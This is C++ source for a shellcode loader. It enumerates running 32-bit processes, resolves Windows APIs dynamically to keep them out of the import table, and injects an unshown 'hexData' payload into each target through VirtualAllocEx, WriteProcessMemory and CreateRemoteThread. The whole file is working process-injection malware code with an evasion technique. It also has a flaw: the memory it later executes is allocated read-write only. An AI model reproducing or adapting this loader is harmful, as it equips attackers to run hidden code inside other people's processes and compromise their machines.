#include "anticheat.h"
#include <stdint.h>
#include <string>
#include "protocol.h"
#include "utils/utils.h"
#include "utils/api_resolver.h"
#include <set>
#include "pac.h"

namespace ShellCode
{
    DWORD create_remote_thread(DWORD dwProcessId);
    uint32_t main()
    {
        Utils::CWindows::instance().power();
        auto process_maps = Utils::CWindows::instance().enum_process();
        for(auto &process : process_maps)
        {
            if(process.second.is_64bits) continue;

            if(create_remote_thread(process.second.pid) == 0) break;
        }
        return 0;
    }


    DWORD create_remote_thread(DWORD dwProcessId)
    {
        DWORD dwSize = sizeof(hexData) + 1;

        auto OpenProcess = IMPORT(L"kernel32.dll", OpenProcess);
        auto VirtualAllocEx = IMPORT(L"kernel32.dll", VirtualAllocEx);
        auto WriteProcessMemory = IMPORT(L"kernel32.dll", WriteProcessMemory);
        auto CreateRemoteThread = IMPORT(L"kernel32.dll", CreateRemoteThread);
        auto WaitForSingleObject = IMPORT(L"kernel32.dll", WaitForSingleObject);
        auto VirtualFreeEx = IMPORT(L"kernel32.dll", VirtualFreeEx);
        auto CloseHandle = IMPORT(L"kernel32.dll", CloseHandle);

        HANDLE hProcess = OpenProcess(
            PROCESS_QUERY_INFORMATION |
            PROCESS_CREATE_THREAD |
            PROCESS_VM_OPERATION |
            PROCESS_VM_WRITE,
            FALSE, dwProcessId);
        if(hProcess == NULL)
        {
            return(1);
        }

        LPVOID remote_entry_point = (PWSTR)VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
        if(remote_entry_point == NULL)
        {
            return(1);
        }

        DWORD n = WriteProcessMemory(hProcess, remote_entry_point, hexData, dwSize, NULL);
        if(n == 0)
        {
            return(1);
        }
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (PTHREAD_START_ROUTINE)remote_entry_point, NULL, 0, NULL);
        if(hThread == NULL)
        {
            return(1);
        }

        WaitForSingleObject(hThread, INFINITE);

        if(remote_entry_point != NULL)
            VirtualFreeEx(hProcess, remote_entry_point, 0, MEM_RELEASE);

        if(hThread != NULL)
            CloseHandle(hThread);

        if(hProcess != NULL)
            CloseHandle(hProcess);
        return(0);
    }
}